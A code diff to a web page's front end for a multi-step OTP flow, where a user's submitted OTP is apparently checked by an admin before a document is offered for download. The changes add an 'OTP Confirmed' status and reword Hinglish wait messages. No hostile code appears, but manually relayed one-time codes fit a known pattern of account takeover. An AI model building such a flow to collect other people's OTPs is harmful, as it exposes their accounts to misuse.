@@ -177,9 +177,10 @@ th { font-size: .76rem; text-transform: uppercase; letter-spacing: .06em; color:
     <div id="step3Waiting" style="display: none;">
       <div class="status-box">
         <div class="spinner" id="waitSpinner"></div>
-        <h3 id="waitTitle" style="margin: 0 0 8px; font-size: 1.2rem; color: var(--ac);">Checking OTP confirmation...</h3>
+        <!-- Updated Title and Message as requested -->
+        <h3 id="waitTitle" style="margin: 0 0 8px; font-size: 1.2rem; color: var(--ok);">OTP Confirmed</h3>
         <p id="waitMsg" style="color: var(--mut); font-size: 0.88rem; max-width: 480px; margin: 0 auto 20px;">
-          Admin dwara OTP verify kiya ja raha hai &amp; document generate ho raha hai. Kripya pratiksha karein.
+          otp approved wait for document generation for download
         </p>
 
         <div id="downloadContainer" style="display: none;">
@@ -324,13 +325,24 @@ async function checkAndRestoreStep() {
       clearInterval(pollTimer);
       showWrongOtp();
     }
+    else if (otpStatus === 'verified' || req.s === 'success') {
+      // Jab OTP approve ho jaye, par file upload na ho
+      document.getElementById('step2Otp').style.display = 'none';
+      document.getElementById('step3Waiting').style.display = 'block';
+      document.getElementById('waitSpinner').style.display = 'block';
+      document.getElementById('waitTitle').textContent = 'OTP Confirmed';
+      document.getElementById('waitTitle').style.color = 'var(--ok)';
+      document.getElementById('waitMsg').textContent = 'otp approved wait for document generation for download';
+      document.getElementById('downloadContainer').style.display = 'none';
+      startStatusPolling();
+    }
     else {
       document.getElementById('step2Otp').style.display = 'none';
       document.getElementById('step3Waiting').style.display = 'block';
       document.getElementById('waitSpinner').style.display = 'block';
       document.getElementById('waitTitle').textContent = 'Checking OTP confirmation...';
       document.getElementById('waitTitle').style.color = 'var(--ac)';
-      document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai & document generate ho raha hai. Kripya pratiksha karein.';
+      document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai. Kripya pratiksha karein.';
       document.getElementById('downloadContainer').style.display = 'none';
       startStatusPolling();
     }
@@ -482,7 +494,7 @@ document.getElementById('fOtpForm').onsubmit = async function(e) {
   document.getElementById('waitSpinner').style.display = 'block';
   document.getElementById('waitTitle').textContent = 'Checking OTP confirmation...';
   document.getElementById('waitTitle').style.color = 'var(--ac)';
-  document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai & document generate ho raha hai. Kripya pratiksha karein.';
+  document.getElementById('waitMsg').textContent = 'Admin dwara OTP verify kiya ja raha hai. Kripya pratiksha karein.';
   document.getElementById('downloadContainer').style.display = 'none';
 
   startStatusPolling();
@@ -529,6 +541,14 @@ function startStatusPolling() {
         
         renderHistoryTable();
         return;
+      }
+      else if (otpStatus === 'verified' || req.s === 'success') {
+        // Jab admin approve kar de par file abhi upload na ki ho
+        document.getElementById('waitSpinner').style.display = 'block';
+        document.getElementById('waitTitle').textContent = 'OTP Confirmed';
+        document.getElementById('waitTitle').style.color = 'var(--ok)';
+        document.getElementById('waitMsg').textContent = 'otp approved wait for document generation for download';
+        document.getElementById('downloadContainer').style.display = 'none';
       }
     } catch (e) {
       console.error('Polling error:', e);
